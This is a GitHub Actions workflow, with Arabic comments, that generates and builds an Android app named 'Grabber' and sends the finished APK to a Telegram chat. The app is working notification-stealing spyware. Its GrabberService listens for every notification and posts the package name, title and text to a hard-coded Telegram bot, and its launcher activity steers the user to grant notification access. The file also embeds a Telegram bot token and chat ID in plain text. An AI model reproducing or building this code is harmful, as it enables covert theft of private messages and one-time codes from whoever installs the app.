name: Hussein Final Notification Grabber

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build-final-app:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 11
        uses: actions/setup-java@v4
        with:
          java-version: '11'
          distribution: 'temurin'

      - name: 🔧 Install Gradle 7.5
        run: |
          # تنزيل وتثبيت Gradle 7.5
          wget -q https://services.gradle.org/distributions/gradle-7.5-bin.zip
          unzip -q gradle-7.5-bin.zip
          sudo mv gradle-7.5 /opt/gradle
          echo "/opt/gradle/bin" >> $GITHUB_PATH
          
          # إظهار الإصدار
          gradle --version

      - name: 🛠️ Create Simple Working Project
        run: |
          # إنشاء هيكل المشروع
          mkdir -p app/src/main/java/com/hussein/grabber
          mkdir -p app/src/main/res/drawable
          mkdir -1[image]app/src/main/res/values
          
          # settings.gradle بسيط
          cat <<'EOF' > settings.gradle
          include ':app'
          EOF
          
          # build.gradle الرئيسي
          cat <<'EOF' > build.gradle
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:7.4.2'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF
          
          # app/build.gradle بسيط جداً
          cat <<'EOF' > app/build.gradle
          apply plugin: 'com.android.application'
          
          android {
              compileSdkVersion 30
              
              defaultConfig {
                  applicationId "com.hussein.grabber"
                  minSdkVersion 21
                  targetSdkVersion 30
                  versionCode 1
                  versionName "1.0"
              }
          }
          
          dependencies {
              implementation 'com.squareup.okhttp3:okhttp:3.12.13'
          }
          EOF
          
          # AndroidManifest.xml
          cat <<'EOF' > app/src/main/AndroidManifest.xml
          <manifest package="com.hussein.grabber">
              
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
              
              <application android:label="Grabber">
                  
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  
                  <service android:name=".GrabberService"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
                  
              </application>
          </manifest>
          EOF
          
          # MainActivity.java
          cat <<'EOF' > app/src/main/java/com/hussein/grabber/MainActivity.java
          package com.hussein.grabber;
          
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.provider.Settings;
          
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  startService(new Intent(this, GrabberService.class));
                  startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  finish();
              }
          }
          EOF
          
          # GrabberService.java
          cat <<'EOF' > app/src/main/java/com/hussein/grabber/GrabberService.java
          package com.hussein.grabber;
          
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.os.Bundle;
          import android.app.Notification;
          import android.util.Log;
          
          import java.io.OutputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          
          public class GrabberService extends NotificationListenerService {
              private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
              private static final String CHAT_ID = "7392262688";
              
              @Override
              public void onCreate() {
                  super.onCreate();
                  sendToTelegram("✅ Service Started");
              }
              
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  Bundle extras = sbn.getNotification().extras;
                  String title = extras.getString(Notification.EXTRA_TITLE, "");
                  String text = extras.getString(Notification.EXTRA_TEXT, "");
                  
                  String msg = sbn.getPackageName() + ": " + title + " - " + text;
                  sendToTelegram(msg);
              }
              
              private void sendToTelegram(final String message) {
                  new Thread(() -> {
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + message + "\"}";
                          conn.getOutputStream().write(json.getBytes());
                          conn.getResponseCode();
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e("Grabber", e.getMessage());
                      }
                  }).start();
              }
          }
          EOF

      - name: 🏗️ Build APK
        run: |
          # بناء APK
          gradle clean assembleDebug
          
          # نسخ APK
          cp app/build/outputs/apk/debug/app-debug.apk Hussein_Final.apk

      - name: 📤 Send to Telegram
        run: |
          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
            -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
            -F "document=@Hussein_Final.apk"
